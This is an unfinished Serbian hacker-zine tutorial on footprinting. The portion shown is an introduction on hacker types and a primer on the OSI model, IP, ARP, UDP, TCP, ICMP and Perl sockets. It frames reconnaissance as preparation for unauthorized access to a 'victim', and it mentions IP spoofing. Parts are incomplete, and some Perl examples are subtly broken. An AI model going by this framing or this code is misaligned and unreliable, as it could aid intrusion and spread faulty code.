 
                            ...................
                      ...::: phearless zine #1 :::...                       

....................>---[ The Art of Footprinting ]---<.......................

.........................>---[ by _bl00dz3r0_ ]---<...........................
                   .: mail 2: blood [at] gmail dot com :.
		   
		   

 [0x00] %  Introduction
 [0x01] %  Networking Revealed
     <0x01a> Intro
     <0x01b> In Protocol's Claw
     <0x01c> Ports & Sockets
     <0x01d> Services get naked
     <0x01e> coMmon thingZ
     
 [0x02] %  System eXposed
     <0x02a> Footprinting
     <0x02b> Port scaning
     <0x02c> Services show their faces
     <0x02d> NC blowj0b
     <0x02e> OS FingerPrinting 
     <0x02f> 

 [0x03] %  EOF
     <0x03a> OUTRO
     ,0x03b> Credits		       
=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+		       
  

 --==<[ 0x01 %  INTRODUCTION
       \_____________________/    
      
  
  *Umetnost Snimanja Sistema* - koliko krupna rec.Samo citanje naslova vam odm-
ah skrece paznju.UMETNOST kako se nesto kao sto je besomucno traganje za rupama
na kompjuterskom sistemu moze porediti sa finim delima Monea ili predivnim sti-
hovima koje nam je podario Po ....hmmm svakako da nemoze,ali sama cinjenica da 
se tome posvecuje duzna paznja i da se hakeri dizu u nebesa kao nadprosecno in-
teligentni ljudi koji vecinu svog zivota provedu ispred monitora zanemarujuci 
socijalni zivot i bilo kakav vid drustvenih odnosa. Hakeri se dizu na nivo umet-
nika,a hakvanje na pijedestal umetnosti.
  Snimanje sistema je samo jedan mali sraf u masineriji hakovanja.Kada kazem 
hakovanje mnogo grubo zvuci. Zadnjih godina kada su prosla slavna vremena Cyber
Ratova LoD-a i MoD-a i zlatna vremena pravih kompjuterskih hakera ,danas kada
se pojam haker toliko izopacio i toliko izmenio i odmetnuo od svoje prave defi-
nicije prosto je izlisno nekoga nazvati hakerom nebitni koliko taj neko stvarno
poseduje atributa da bi ga tako mogli osloviti.
  Generalno praksa je postala smatrati sve i svakoga za hakera. Dovoljno je zna-
ti ili nacuti mesta na kojima hakeri objavljuju svoje programe,svoje pronalaske
u oblasti sigurnosti - kako bi uspesno izvrsili svoj prvi *hack* i odmah budete
zigosani i vidjeni u ocima onih koji slabo prate tu tematiku kao HAKER.
Skidanje exploita dobro poznatih rupa vam svakako nece proci dobro u ocima pr-
ve kompjuterske elite. Granice izmedju raznih podela u Hakerskim krugovima su
veoma jasne. Velike su razlike izmedju pravog hakera i jednog *Script Kiddia*,
cije se znanje svodi na ukljucivanje nekog vuln scannera tipa *NessUs*,a zatim
citanje REPORT-a i odlazak na securityfocus u potrazi za vec gotovim alatima 
koje mogu iskoristiti u nadi da ce nesto hakovati.
  Stereotipi se cesto ruse. Pa smo tako u vreme zlatnih godina haka imali jasnu
podelu na:

  [=- White Hat  - hakeri dobrice,vecinom programeri i security experti
  
  [=- Gray Hat   - hakeri dobrice koje cesto prelaze na tamnu stranu,imaju 
                   zelje za destrukcijom ponekad, ali se nemogu smatrati  
		   toliko zlim kao npr sto je slucaj sa Black hat hakerima.
		   
  [=- Black hat  - hakeri zloce.Hakeri koji su tu samo da unistavaju stvari
                   ,hakeri koje svoje zadovoljstvo/nezadovoljstvo ispoljavaju
		   na veoma destruktivan nacin - unistavajuci podatke.
		   
  Medjutim kao sto rekoh te podele se polako brisu i nestaju.
Sada je popularno govoriti za Black hat hakere da su *crackeri*, a sam cin
hakovanja se naziva *crack*.
Svako je slobodan da tumaci te pojmove onako kako on zeli i onako kako to njemu
odgovara - etika je nesto drugo,a to je gosn MENTOR jasno pokazao.
  Zelim jos malo da pojasnim pojam haker kako sa pogresnom slikom u glavi ne
bi nastavili dalje citanje teksta. Ja takodje sebe nimalo ne deklarisem za hake-
ra jer to bi bilo smesno. Do hakera je dug put.Medjutim uz volju sve se moze po-
stici.
  Navescu neke primere tipicnog izgleda hakera:
  
   [-= White Hat Hacker =-]
   
 Kao sto rekoh ovaj haker je dobrica.White Hat hakeri su po pravilu odlicni pr-
 ogrameri sa sposobnoscu da cesto nadju rupe u software-u, a zatim napisu i ex-
 ploit za tu rupu koji potom izdaju u javnost.Ovi hakeri nikada ne traze publi-
 citet niti ih to zanima. Za njih popularnost nema smisla.Poznati su u krugovima]
 u kojima i treba da budu poznati u krugu - elite tj u krugu security experata.
 Ovakav haker mora imati veoma dobro znanje o ptorokolima,servisima uospte o
 NETWORKING-u, zatim mora biti dobar programer i poznavati Arhitekturu racunara.
 Cesto White Hat hakeri ucestvuju u projektima unapredjenja Sigurnosti Sistema.
 Cesto takvi hakeri ne idu na irc ili se ne krcu po forumima vec rade vise ne u
 tajnosti vec malo dalje od publiciteta i sl. Vise vole da se cuje ime njihove 
 grupe i pronalasci nego njihovo ime.

  [-= Black hat Hacker =-]
  
 Hakeri koji po pravilu nemaju pretenzije na slobodu informacija i slicne mora-
 lne i eticke porive,vec svoju svrhu vide u unistavanju podatka u teranju drug-
 h da pate i sl. Ovakvi hakeri nemoraju biti script kidozi niti neki lameri,oni
 su cesto veoma vesti programeri i poznavaoci materiji kao i npr White Hat hak-
 eri.Medjutim svoje znanje i entuzijazam upotrebljavaju na pogresnom mestu.Vole
 publicitet voled a se njihovo ime cuje da budu popularni.Iako su cesto najmanje
 postovani od svih hakera gotovo uvek su najopasniji. Takvim se postaje npr
 gledajuci filmove Hackers i npr iz nekog besa ili nezadovoljstva. Pa tako neki
 vide olaksanje sebi u vidu rusenja sistema sajtova i sl.
 
 Medjutim dosta vise brljanja o pojmu haker i svemu sto ima veze sa moralnim
pripovedanjem :).Vreme je da se kaze i koja rec o samoj tematici teksta,koja
svakako nije "HOW TO BECOME HACKER". U stvari znam da ce mnogi misliti kada pro-
citaju ovakvo nesto e ovo procitam i mogu da hakujem. To je greska u startu.Ovo
je samo jos jedan tutorial koji ce vam pomoci da krenete pravim putem,da ucite
u dubinu da saznate sto je vise moguce o svemu vezano za IT tehnologiju.
Nije dovoljno samo upotrebiti exploit u neke svrhe vec je vazno znati kako on
radi zasto je doslo do toga sto je doslo,kako to da su me otrkili i sl.
 Bash zbog toga sto smatram da je vazno znati sto vise i sto dublje napisao sam
ovakav tekst. U njemu ce biti opisane tehnike Snimanja Sistema koje su brojne i
zavise samo od vaseg znanja i maste.Medjutim napravicu malo duzi uvod u tu tem-
atiku objasnjavajuci samo strukturu mreza,protokole,sockete itd.Jel ruzno je bi-
ti neuki klinac koji pokrene nmap i ceka neke tamo reziltate.Vazno je znati sta
to sada gledate cemu sluzi to i to. Zato je vazno bar neko osnovno upoznavanje
na temu TCP/IP protokola i mreza uopste. 
Svakako da vam ja sada nemogu napisati knjigu o Snimanju sistema,ali cu pokusa-
ti da objasnim kako sve to funkcionise na neki razumljiv nacin.
Bavicemo se malo proucavanjem portova, servisima koji slusaju na tim portovima,
procavanjem socketa i njihove namene i jos sa mnogo aktraktivnih tema.
  Posle tog osnovnog uvoda i upoznavanja sa materijom polako cemo preci na sus-
tinu tutoriala, a to je Snimanje Sistema.To je veoma mocan, dug i ponekad naporan
proces medjutim veoma efikasan,preko potreban i koristan.
Ne samo da ce biri reci o famoznom PORT skeniranju vec i o popisivanju sistema
sto ce doprineti do ostvarivanja blizeg kontakta sa zrtvom.
  Danas sve je visa mesta odakle se mogu pokupiti neophodni resursi i informac-
ije o odredjenim stvarima kao sto su npr. ciljani sistemi. To nemora biti nuzno
neki hakerski alati dovoljan je i WWW koji pruza mnostvo korisnih informacija.
Sakupljanje i otkrivanje svih detalja i pojedinosti o zrtvi preraslo je u svoj-
evrsan ritual i jednostavno obavezu uspesnog hacka. Pravo zadovoljstvo je kada
o ciljanom sistemu saznate sve pojedinosti, kada ima mnostvo informacija koje 
mozete iskorstiti onako kako vama to odgovara. Nije umece ovog zanata samo isp-
itati sve otvorene portove ili sl. Vazno je i razumeti njihov rad kako bi iskor-
istili i stavili ih pod svoju kontrolu.
  Cesto kompanije pa i obicni useri ne shvataju koliko su izlozeni na internetu
,koliko je lako doci do informacija o njima. Lazni osecaj anonimnosti koristeci
npr neki proxy ili osecaj sigurnosti koristeci firewall vam nece pomoci kada se
na vas nameri neko ko zna svoj posao. Kompjuterska bezbednost je samo deo bezbe-
dnosti informacija.
Haker cesto skuplja mnostvo informacija kako bi poboljsao svoje sanse za dobij-
anje neautorizovanog pristupa. Haker ce koristi sirok dijapazon metoda kako bi
dobio veliki broj informacija iz kojih ce kasnije izvuci one koje njemu sluze.

  ZNaci napravili smo neki uvod u ono sto cemo obraditi u ovom tekstu.
Malo smo se podsetili sta znaci biti haker i ko su hakeri u stvari i napravili
fin uvod u Snimanje Sistema objasnjavajuci sta ono predstavlja.
Takodje smo naznacili koliko je ono vazno u postupku osvajanja jednog sistema.
Shvatili smo da je veoma bitno doci do sto vise informacija o ciljanom sistemu.
Bitno je proveriti sve izvore koji su nam dostupni.
  Dalje cemo nastaviti sa poglavljem o Mrezama.Pokusacu sto vise mogu da objas-
kako one funkcionisu da pojasnim ulogu socketa protokola i tome slicno.
Vazno je da koristiti i druge izvore da ucite iz drugih knjiga koje su radjene
specificno za te oblasti jel ja nemogu toliko bas u dubinu ici niti imam vreme-
na niti mesta ;). Enjoy



=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+		       
  

--==<[ 0x01 %  Networking Revealed
      \___________________________/ 
      
  
   
   
   ==-[ 0x01a % INTRO    
   
  Na pocetku da napravimo mali uvod u mreze, koji ce vas polako uvesti u duboke
hodnike TCP/IP ;)).
Sta predstavlja mreza?
Najjednostavnije objasnjenje bi bilo - mreza je grupa povezanih racunara,najma-
nje dva. Ta grupa moze da deli fajlove, uredjaje itd.
Mnoge mreze imaju svojstvenu topologiju,koja zahteva jedan server i klijente
povezane na njega. Obicno se na tom serveru nalaze svi programi, aplikacije i se-
rvisi koji su potrrebni klijentima. Time se znatno stedi na resursima.
klijenti u svako doba mogu da pristupe serveru.
Ako ne bi stavljali server svaka aplikacija bi morala biti instalirana/kopirana
na svaki korisnicki sistem tj na svaki klijent.
  Medjutim u mrezi moze postojati i vise servera, koji mogu deliti resurse.
Topologija mreze je odredjena tipom mreze.
Mreze mogu biti WAN i LAN.
Wan mreze su mreze koje pokrivaju siroke tj vece oblasti dok LAN mreze su loka-
lne prirode. Samo cemo nabrojati razlicite topologije mreza:

   [=- Arhitektura prstena
   
   [=- Arhitektura huba
   
   [=- Arhitektura Magistrale
   
 Vise o njima mozete naci o njigama koje se bave proucavanjima iz oblasti mreza.
Vazni aspekti u mrezi su sigurnost i dostupnost.
Sigurnost je svakako ono sto nas najvise zanima. Administrator mreze je zaduzen
za sigurnost, medjutim cesto se na sigurnost najmanje obraca paznja.
Vise o mrezama u narednim sekcijama.
   
   ==-[ 0x01b % In Protocol's Claw
   
   ..[=-< TCP Suite
   .
   .
  Protokol je standard za kog programi moraju biti napisani. Znaci protokol odr-
edjuje nacin slanja podataka preko nreze.
TCP/IP - rad na TCP/IP protokolima je poceo jos 1973 godine. To je set mreznih 
protokola koji dozvoljavaju svakom racunaru, svakom sistemu da uspostavi vezu sa
drugim sistemom koristeci mreznu topologiju. 1978 god. zavrsen je rad na IPv4,
koji koristimo i dan danas medjutim novi i moderniji IPv6 polako preuzima prim-
at.*Barkaley University* je prvi put u svoju verziju UNIX-a,BSD ugradio TCP/IP
protokol.BSD je bio veoma omiljen u istrazivackim centrima i univerzitetima.
Takodje bio je besplatan. TCP/IP dodje kao skup svih tih protokola koji omoguca-
vaju prenos podataka preko mreze i to u bilo kom formatu. Znaci slike,tekst sve
mozete prenositi preko mreze....
  A sada malo o TCP/IP arhitekturi.TCP/IP je modularan protokol. U stvari on je 
familija ptorokola,skup protokola sve od aplication-level funkcija pa do low-l-
evel mreznih protokola kao sto su IP i TCP protokoli. Navescu neke dobre strane
TCP/IP protokola zbog kojih je i postao popularan. Iako njegov razvoj nije bio
toliko brz i njegovo sirenje je zahtevalo vremena, na kraju mreza nebi opstala 
bez njega.

   [=- standardizacija high-level protokola za siroko dostupne korisnicke serv-
       ise.
       
   [=- Otvorena arhitektura protokola. Podrzana od strane svih platforma.
       Radi na svim OS i svom hardware-u.
       
   [=- Otvoren za development.
   
   [=- Nezavistan od mreznog hardvera. TCP/IP moze da radi nezavisno od mrezne
       arhitekture tj dal se radi o Ethernetu, dial upu ili bilo cemu drugom.
       
   [=- Jednostavna sema za adresiranje koja dozvoljava, adresiranje sirom mreze
       ma kolko ta mreza bila velika.
       
  Posto su toliko otvoreni TCP/IP protokoli su dobro i dokumentovani.Tako da u
*RFC* (Requests for Comments), moze naci najnovije specifikacije TCP/IP protok-
ola.Koriscenje RFC je preko potrebno za dobro razumevanje rada mreze.
  Arhitektalni model TCP/IP protokola je definisan preko *OSI* standarda.
OSI je skracenica od Open Systems Interconnect Reference Model,i OSI obezbedju-
je osnovne reference u sferi protokola. On definise pravila ponasanja protokola.
OSI sadrzi 7 slojeva (layers), koji definisu funkcije protokola. Svaki taj layer
prikazuje funkciju koja se izvrsava kada se podatci premestaju tj transferuju
izmedju aplikacija. Layeri su naredjani jedan na drugog poput blokova i imaju i-
zgled zida. Ovakva struktura se naziva "Protocol Stack".


        -----------------------------
	|  Aplikacioni (aplication) |
	-----------------------------
	|Prezentacioni(presentation)|
	-----------------------------
	|     Sesioni (session)     |
	-----------------------------
	|        Transportni        |
	-----------------------------
	|   Mrezni sloj  (network)  |
	-----------------------------
	|      Data Link layer      |
	-----------------------------
	| Fizicki sloj (physical)   |
	-----------------------------
	
  Ovako izgleda OSI model.
  
   [=- Fizicki sloj - Ovaj sloj definise karakteristike hardverskih uredjaja 
       koji su potrebni za prenos podataka. On definise kolika ce biti volataza
       tu i tu,koliko ce pinovati imati kabal, kako ce izgledati dzek,kako se 
       izvodi pravilno kabliranje itd.
       
   [=- Data Link sloj - Retko kad TCP/IP protokoli prave protokole u ovom sloju.
       Ovaj sloj definise kako ce se podatci prenositi preko fizickog sloja.
       Takodje ovaj sloj je zaduzen za ispravan rad fizickog sloja. Ukoliko dodje
       do gubljenja podataka u prenosu preko sloja on Data Link sloj se mora no-
       siti sa greskama pokusavajuci da ponovo posalje informaciju ili reportu-
       je pad mreznog sloja.
       
   [=- Network sloj - Ovaj sloj upravlja konekcijama preko mreze.Znaci on vrsi
       prenos podataka, zatim sluzi za identifikovanje adresa sistema u mrezi itd
       Na vecini mreza ovaj sloj ne vrsi proveru integrisanosti vec jednostavno
       vrsi pakovanje i dostavu paketa.
   
   [=- Transport sloj - Transport sloj je zaduzen za proveru rada Network sloja.
       Ukoliko dodje do gresaka u network sloju Transport sloj ce pokusati pon-
       ovno slanje podataka. Takodje ovaj sloj garantuje primaocu da ce dobiti
       paket u istom obliku kao sto je taj paket i poslat. U TCP/IP familiji pr-
       otokola ovu funkciju obavlja TCP (Transmission Control Protocol), ali tu
       je i User Datagram Protocol (UDP) koji funkcionise razlicito od TCP, ali
       to ce biti kasnije objasnjeno.
       
   [=- Sesioni sloj - On upravlja sesijama tj konekcijama izmedju aplikacija ko-
       je saradjuju. U vezi ovog sloja cemo objasnjavati i portove i sockete kao
       puteve koji sa kmunikacija vrsi.
       
   [=- Prezentacioni sloj - Ovaj sloj obezbedjuje standardnu rutinu za prezent-
       aciju podataka. Npr Prezentacioni sloj omogucava kompresiju, omogucujuci 
       tako poboljsanje perfomansi prenosa itd.
       
   [=- Aplikacioni sloj - omogucava mrezni interfejs krajnjem korisniku aplika-
       cionih protokola kao sto je npr HTTP.
       
  Malo smo pojasnili slojeve u OSI modelu i njihovu upotrebu i funkciju,nasta-
vicemo da koracamo dubokim hodnicima mreznih sistema :)

   ..[=-< IP Protocol
   .
   .                 
   
  Sada cemo reci nesto vise  o nekolicini protokola ponaosob.     
Kao sto se iz naslova moze zakljuciti prvi na redu je IP protokol tj Internet
Protocol.
  Internet Protokol je deo TCP/IP protokola, koji omogucava mnogo toga.
On sadrzi informacije o adresiranju i kontroli, i te informacije omogucavaju da
se paketi rutiraju kroz internet.
Paket je kompresovan niz podataka, na cijem se vrhu nalazi *header*,koji sadrzi
razne podatke o cemu cemo kasnije imati vise reci. Ruteri tj uredjaji koji ispi-
tuju pakete svlace header i citaju osetljive informacije o rutiranju.Sadrzaj
headera se moze menjati u toku transporta. Hakeri cesto koriste metode spoofa
kako bi maskirali svoju pravu IP i to rade menjajuci sadrzaj headera IP paketa.
Sada cemo videti kako jedan IP paket izgleda:

     ______________________________________________________________
     |  bits     4        8                     16   19  24    31 |
     | __________________________________________________________ |
     | | version | Lenght |      Tip servisa     | Totalna duzina |           
     | ------------------------------------------------------------
     | |-----------------------------------------|----|-----------|
     | |   Indetification                        |Flag|Fragment Offset
     | |----------------------------------------------------------|
     | | time to live     |       Protocol       |Header Checksum |
     | |----------------------------------------------------------|
     | |   S O U R C E                 A D D R E S S              |
     | |----------------------------------------------------------|
     | |  D E S T I N A T I O N      A D D R E S S                |
     | |----------------------------------------------------------|
     | |                   O P T I O N S                          |
     | |-----------------------------------------------------------
     | |                    D A T A                               |
     | |__________________________________________________________|
     |____________________________________________________________|
     
     
   Izvrisicemo malu analizu ovih polja:
   
   [=- Version - Verzija IP koja se trenutno koristi
   [=- Lenght  - Velicina headera
   [=- ToS     - Type of Service 
   [=- Total l,- Totalna velicina IP paketa.
   [=- Identif.- Indetification, broj koji pomaze pri skupljanju datagram
                 fragmenata.
   [=- Flag    - 3-bit polje>prvi bit pokazuje dali paket moze biti fragmentovan
                 Drugi pokazuje dali je ovaj fragment poslednji fragment u seri-
		 ji,a treci bit se trenutno ne koristi.
   [=- F ofsset- Fragment ofsset, lokacija fragmentovanih podataka. 
   [=- TTL     - time to Live, brojac koji odbrojava do 0. Kada odborji do 0
                  paket se ispusta, bez njega bi paketi kruzili neprestano.
   [=- Protocol- Ukazuje da gornji protokol prima nadolazece pakete.
   [=- H check.- Header checksum, brine se o integritetu paketa.
   [=- Adress  - Adrese posaljioca i primaoca.
   [=- Options - Opcije vezane za sigurnost.
   [=- Data    - Informacije
   
   Jos da napomenem sta su IP datagrami (datagrams).
IP datagrami su u osnivi veoma proste tako reci osnovne transportne jedinice
na Internetu. Datagrami takodje imaju header sa informacija o rutiranju koje
koriste ruteri.

IP datagram izgleda ovako:

           _________________________________________________
	   |      PODATCI  ZA  GORNJE SLOJEVE              |
	   |_______________________________________________|
	   |    IP  HEADER       |       IP DATA           |
	   |_____________________|_________________________|
	   | DATA link HEADER | Data link data | Frame check segments 
	   |__________________|________________|___________|
	   
   ..[=-< ARP Protocol
   .
   .
	              
  Vreme je da se upoznamo i sa Adress Resolution Protokolom.
Postavlja se pitanje kako npr ruter uspe da uporedi IP adresu sa fizickom hard-
verskom adresom. Svaki uredjaj tipa mrezna karta itd imaju jedinstvenu adresu
koju im dodeljuje prozivodjac. Nemogu dva uredjaja imati istu adresu.
ARP protokol se koristi za mapiranje adresa.U sustini ARP je paket koji se salje
svim hostovima koji su prikaceni na psihicku mrezu. Paket sadrzi IP adresu masine
sa kojom posaljioc zeli da komunicira. Ostali hostovi u mrezi prvo skladiste ko-
piju te adrese i kada vide da nije namenjena njima ignorisu je. Kada pravi host
primi paket on na njega odgovara sa svojoj fizickom adresom koja se vraca pos-
aljiocu i smesta u *ARP CACHE*.Arp nije Internet protokol,on nema lokalnu logi-
cku mrezu pa se stoga nemora rutirati. On putuje od masine do masine dok ne dodje
do zeljenog sistema.
  Znaci ARP daje tabelu prevoda IP adresa ka Ethernet adresama.
Table se pravi dinamicki. Kada ARP primi zahtev za prevodjenje on onda gleda u 
tabelu, ukoliko nadje IP adresu u tabeli vraca Ethernet adresu posaljiocu, a ako
ne nadje onda kao sto sam vec opisao salje pakete od hosta do hosta.
Pokazacu samo jedan primer kada ARP vrsi prevodjenje.

 ==---------[code]----------==
 
 root@digital-phear:~# arp -a
? (10.2.5.1) at 00:01:02:36:17:22 [ether] on eth0

 ==---------[/code]---------==

 -a switch ce na uvid dati celu tabelu. Naravno za kompletno savladavanje ARP
utila konsultujte man stranice na vesem sistemu, posto postoji veci broj opcija.
Takodje vazno je razumeti izlaz koji dobijete.




   
   
   
   
   
   
   ..[=-< UDP Protocol
   .
   .                  
   
  UDP je je jednostavan transport-layer protokol, koji je opsirno opisan u RFC-
768.Cesto se kaze za UDP da je protokol koji ne ostvaruje konekciju - connecti-
nless.Takodje kod UDP protokola nema garancija da ce paket stici na destinaciju
tj da ce datagram stici na svoje finalno odrediste. Znaci nema trajnog uspostav-
ljanja konekcije izmedju servera i klijenta, vec server npr moze odjednom da
na socket primi vise datagrama sa razlicitih adresa,a klijent odmah posle slanja
jednog datagrama moze da salje drugi na sasvim drugi server.
UDP ima i drugih problema kao npr ukoliko datagram stigne na odrediste,ali che-
cksum uvidi neku gresku datagram nece biti dostavljen socketu vec ce biti izvr-
seno retransmitovanje tj ponovno slanje.
Svaki datagram ima odredjenu duzinu, koja se prosledjuje primajucoj aplikaciji
zajedno sa podatkom. 
U stvari ono sto se desava jeste da aplikacija zapisuje poruku i te poruke se 
nazivaju datagrami. Zatim se ti datagrami enkapsiliraju u IP pakete sa sve pod-
atkom i headerom i zatim putuju internetom.
Pokazacemo kako i izgleda jedan UDP datagram:

          __________________________________________
	  |   Source PORT    |   Destination PORT  |
	  |__________________|_____________________|
	  | Message Lenght   |       Checksum      |
	  |__________________|_____________________|
	  |              D  A  T  A                |
	  |________________________________________|
	 
  [=- PORT  - 16bit-ni port broj, koji se koristi u procesiranju datagrama.
  [=- Mess. - Message lenght, oznacava broj okteta u datagramu.
  [=- Chec. - Ovo je opcionalno polje i sluzi za verifikovanje dostave datagrama	  
  [=- DATA  - podatak.            






   ..[=-< TCP Protocol
   .
   .     
   
  TCP ili Transmission Control Protocol je razlikuje od UDP protokola po mnogim
stvarima.
U sustini TCP omogucuje konekciju izmedju klijenta i servera.
TCP klijent uspostavlja vezu sa serverom razmenjuje podatke sa njim i na kraju
gasi tu vezu.
Za razliku od UDP protokola mozete biti sigurni dali je paket stigao na destin-
aciju ili nije stigao.Kod UDP to neznate. Zasto se to desava?
To se desava usled jel kada TCP posalje paket on trazi ACK paket (acknowledgme-
nt),nazad kako bi znao da je paket stigao na pravo mesto.Ako ACK ne stigne posle
odredjenog vremena TCP automatski ponovo salje paket. Postupak se ponavlja
do odredjenog vremena kada se odustaje od slanja paketa.
Medjutim opet niste sigurni da ce paket stici na odrediste, ali cete biti sigurni
sta se snjim desilo i ukoliko nestigne.

   -= TCP HEADER=-
  
 Header je velicine od 20-60 bajtova. 20 bajtova mu iznosi velicina kada u header
nisu ukljucene opcije, a velicina dostize 60 bajta kada su opcije ukljucene.
Header sadrzi i code bits,njihov ukupan broj je - 6.
Jedan ili vise se mogu ukljuciti u istom trenutku.
Navescu svih 6 flagova:

   [=- URG - urgent point field
   [=- ACK - Acknowledgement
   [=- PSH - ovaj segment zahteva - push
   [=- RST - Resetuje konekciju
   [=- SYN - Synchronise sequence number kako bi zapoceo konekciju
   [=- FIN - Posaljioc je zavrsio sa slanjem podataka
   
   
//////////////////DOPISATI


   ..[=-< ICMP Protocol
   .
   .  
  
  The Internet Control Message Protocol sluzi za dostavu paketa sa porukama.
Te poruke sadrze podatke o greskama i kontroli paketa.
ICMP message encapsulation - je proces koji se sastoji iz dva dela.
Poruke se prvo enkapsuliraju u IP datagrame,koji se zatim enkapsuliraju u frej-
move.Moze doci da se ICMP poruke izgube ili dupliraju.
Izgled ICMP paketa:

            ___________________________________________
	    | MEssage Type |  C O D E  |  Checksum    |
	    |______________|___________|______________|
	    
   [=- Message T. - tip poruke.
   [=- CODE       - Detaljnije opisuje tip poruke
   [=- Checksum   - Brine o integritetu paketa.
  
  Napravicu malu tabelu ICMP poruka kako biste bolje razumeli ukoliko dodjete
u situaciju da iste tumacite.

            __________________________________________
	    |   Tip         |       O P I S          | 
            |_______________|________________________|
	    |      0        |     Echo Reply         |
	    |---------------|------------------------|
	    |      3        | Destination Unreachable|
	    |---------------|------------------------|
	    |      4        |     Source Quench      |
	    |---------------|------------------------|
	    |      5        |     Route Redirect     |
	    |---------------|------------------------|
	    |      8        |     ECho Request       |
	    |---------------|------------------------|
	    |      11       | Datagmra time Exceeded |
	    |---------------|------------------------|
	    |      12       | Datagram Parameter prob|
	    |---------------|------------------------|
	    |      13       | Timestamp Requested    |
	    |---------------|------------------------|
	    |      14       | Timestamp Reply        |
	    |---------------|------------------------|
	    |      15       | Information Requested  |
	    |---------------|------------------------|
	    |      16       |  Information reply     |
	    |---------------|------------------------|
	    |      17       | Address Mask Request   |
	    |---------------|------------------------|
	    |      18       |  Address Mask Reply    |
	    ------------------------------------------
   
   

   ==-[ 0x01c % Ports & SOckets
   
  Kada smo razumeli neke od protokola vazno je da razumemo kako oni medjusobno
komuniciraju,kako se sve to odvija. Da bi to razumelo potrebno je prouciti rad
socketa i portova.
 
   ..[=-< Ports
   .
   .
   
  Kada se podatci prenesu preko mreze bitno je da se podatci dostave pravom ko-
risniku ili pravom procesu.
Svaki sistem koji ima implementiran TCP/IP dopusta korisnicima i programima da
se konektuju na razlicite portove.
Svi znamo takodje da postoje fizicki i softverski portovi.Softverski portovi se
jos nazivaju i virtuelnim.Oni dopustaje da podatci dolaze na racunar i da sa nj-
ega odlaze.
Na portovima rade razlicite aplikacije koje nazivamo - SERVISI.O servisima ce 
biti vise reci kasnije. U UNIX svetu servise nazivamo *DAEMON-ima*.Daemoni su sp-
ecificna vrsta servisa koji rade u pozadini i cekaju na odredjenu akciju.
Postoje dva tipa portova, kao sto su:
Poznati portovi (well known ports) -portovi do 1024 i portovi iznad 1024 
nedokumentovani portovi.
Brojeve portova mozemo videti u fajlu * /etc/services *,tu cete naci brojeve
svih portova kao i kratak opis o istim.
Ja cu u posebnom odelju navesti i opisati servise koji runuju na nekim od port-
ova tako da ce vam biti jasnije kada procitate i taj deo.


   ..[=-< Sockets
   .
   .
   
  Socketi ili mrezne uticnice seljacki receno sluze da se utaknu u mrezne ko-
nekcije. To su krajnje tacke u procesu komunikacije. Socketi dozvoljavaju da pro-
cesi vrse interakciju i komunikaciju preko mreze npr Interneta, znaci na drugom
racunaru.
Na par primera pokazacu vam rad sa socketima. Koristicu PERL programski jezik da
bih vam pokazao kako rade socketi.
Prvo cemo posmatrati klijentsku stranu.
Proces otpocinjem socketa i to uz pomoc socket() sistemskog poziva.
On ima sledeci oblik

The socket() Function
socket(SOCKET, DOMAIN, TYPE, PROTOCOL)

   [=- socket - ovo je samo filehandle i ostavite ovakav kakav jeste
   [=- DOMAIN - tip domena,kod nas PF_INET ako koristimo Internet,a posto su ovi
                argumenti integeri PF_INET ima oznaku 2.
   [=- TYPE   - to je tip mreznog servisa. stavicemo SOCK_STREAM.On je TCP based
   [=- PROTOC.- protokol kojim se govori preko socketa.
   
  Primer kreiranja socketa:
  
   ==---------[code]----------==
   #!/usr/bin/perl 
   use Socket;                            
   socket(SOCKET, PF_INET, SOCK_STREAM, (getprotobyname('tcp'))[2]);
   ==---------[/code]---------==
   
Sada cemo videti primer funkcije bind() koja ce kada se radi o serveru specif-
icirati port na kome ce se cekati za konekciju.
Funkcija ima oblik:

bind(SOCKET, ADDRESS)

   [=- ADRESS - sadrzi tri polja.Prvo govori Adress family a to je AF_INET za 
                TCP/IP.Zatim broj porta i zadnje polje oznacava Internet adresu.
   
   ==---------[code]----------==		
   #!/usr/bin/perl
   use Socket;		
   $port = 12345;                 
   bind(SOCKET, pack('Sna4x8', AF_INET, $port, "\0\0\0\0"))
    or die "Nemogu da se povezem na port  $port! \n";	
   ==---------[/code]---------==	
   
Sledeca je funkcija listen().Ona priprema socket za nadolazece konekcije tj os-
luskuje na odredjenom portu koga smo specifirali sa bind(),za konekcijama.
Ima oblik:

listen (SOCKET, QUEUESIZE)

   [=- QUEUESIZE - je maximalan broj konekcija koje se mogu izvrsiti na dati 
                   port.Prakticno to znaci koliki je broj socketa koji ce se sm-
		   estiti u taj queue. Taj broj nemoze biti veci od 5.
   
   ==---------[code]----------==		   
   #!/usr/bin/perl		   
   use Socket;
   listen(SOCKET, 5)
   ==---------[/code]---------==
   
Sledi funkcija accept(),koja je zaduzena da prihvati nadolazecu konekciju.
Ima oblik:

accept (NEW_SOCKET, SOCKET)

Sa klijentske strane potrebno je imati i sistemski poziv connect().


Sada cu dati primer servera i klijenta ,mapisanih u perlu uz pomoc socketa.

Server:

   ==---------[code]----------==
   #!/usr/bin/perl -w
   use Socket;
   socket(SOCKET, PF_INET, SOCK_STREAM, (getprotobyname('tcp')) [2]);
   $port = 5000;
   bind(SOCKET, pack('Sna4x8', AF_INET, $port, "\0\0\0\0")) || die 
   "Povezivanje na port $port neuspelo\n";
   listen(SOCKET, 5);
   accept (NEW_SOCKET, SOCKET);
   ==---------[/code]---------==
   
Klijent:

   ==---------[code]----------==
   #!/usr/bin/perl

   $server = 127.0.0.1;
   $port   = 5000;

   connect(SOCKET, pack('Sna4x8', AF_INET, $port, (gethostbyname
        ($server))[2])) or die "Can't connect to $server on port $port!";
   ==---------[/code]---------==
   
Sa filehandlovima socketa mozemo raditi isto kao i sa FH fajlova.Mozemo pisati
u njih citati iz njih ,brisati ih i sve sto vam padne na pamet.
Naravno da ovo nisu sve funkcije za rad sa socketima u perlu ima ih jos mnogo,
ali ne zelim da ulazim u dubinu programiranja socketa jel to i nije tema ovog
tutoriala.
  Naravno pokretanjem server aplikacije doticni ce bindovati port 5000 i oslus-
kivati za konekcije na tom portu. Kada pokrenemo klijenta on ce izvrsiti konekt-
ovanje na zadatu IP adresu i na zadati port. Simple as that ;)

Sada cu samo nabrojati i ostale socket funkcije koje mozete korsititi u perlu:

     [=- getpeername() - Vraca adresu socketa,na drugom kraju konekcije.
     [=- getsockname() - Vraca socket adresu na ovom kraju konekcije
     [=- getsockopt()  - Vraca vrednosti socket opcija.
